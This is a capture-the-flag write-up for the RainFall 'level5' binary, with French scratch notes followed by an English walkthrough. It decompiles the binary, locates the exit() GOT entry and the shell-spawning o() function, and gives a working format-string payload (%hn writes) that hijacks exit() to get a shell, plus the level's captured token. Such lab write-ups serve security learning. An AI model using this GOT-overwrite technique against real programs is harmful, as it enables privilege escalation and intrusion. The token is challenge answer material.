fonction o() qui /bin/sh 

gdb ./level5
info address o = adresse de la fonction.

level5@RainFall:~$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 

08049838 R_386_JUMP_SLOT   exit


08049838 adresse GOT de Exit

But: ecrire a l'emplacement de l'adresse exit **0x8049838** l'adresse de o() **0x80484a4** afin que l'appel exit nous redirige vers o()

(echo -e "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"; cat) | ./level5



# level05

1. Decompilation with Ghidra

    the binary contains :
    ```c
    void main(void)

    {
    n();
    return;
    }
    ```
    ```c
    void n(void)
    {
    char local_20c [520];
    
    fgets(local_20c,0x200,stdin);
    printf(local_20c);
                        /* WARNING: Subroutine does not return */
    exit(1);
    }
    ```

    ```c
    void o(void)
    {
    system("/bin/sh");
                        /* WARNING: Subroutine does not return */
    _exit(1);
    }
    ```

2. Analysis of the vulnerability

    The vulnerability:
    - The function o() allows invoking /bin/sh.
    - The exit() call.

3. Finding the GOT address to exit() and address to o()

    Using gdb to find the o() address:

    ```bash
    gdb ./level5

    (gdb) info address o
    Symbol "o" is at 0x80484a4 in a file compiled without debugging.
    ```

    But, for exit() we need GOT address (Global Offset Table).

    ```bash
    objdump -R level5
    [...]
    08049838 R_386_JUMP_SLOT   exit
    [...]
    ```

4. Finding the format string offset

    Test to find where our input appears on the stack:

    ```bash
    python -c 'print "AAAA" + "%x."*5' | ./level5

    # Output: AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.
    ```

    We see `41414141` (AAAA in hex) at the **4th position**.

6. Exploitation

    Format String Payload Breakdown

    **%2044x = Prints 2044 padding characters**

    - Goal: Reach 2052 in byte counter (2044 + 8 bytes from addresses)

    - 2052 = 0x0804 (high part of o()'s address)

    **%31904x = Prints 31904 padding characters**

    - Goal: Reach 33956 in byte counter (2052 + 31904)

    - 33956 = 0x84a4 (low part of o()'s address)

    **%4\$hn = Writes 2-byte counter to address at offset 4**

    - Offset 4 = 0x0804983a (GOT exit + 2)

    - Writes 0x0804

    **%5\$hn = Writes 2-byte counter to address at offset 5**

    - Offset 5 = 0x08049838 (GOT exit)

    - Writes 0x84a4

    ***Final result: GOT exit contains 0x080484a4 = address of o()***

    ```bash
    (echo -e "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"; cat) | ./level5

    whoami
    # Output : level6
    ```

7. Token discovered

    The token is: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
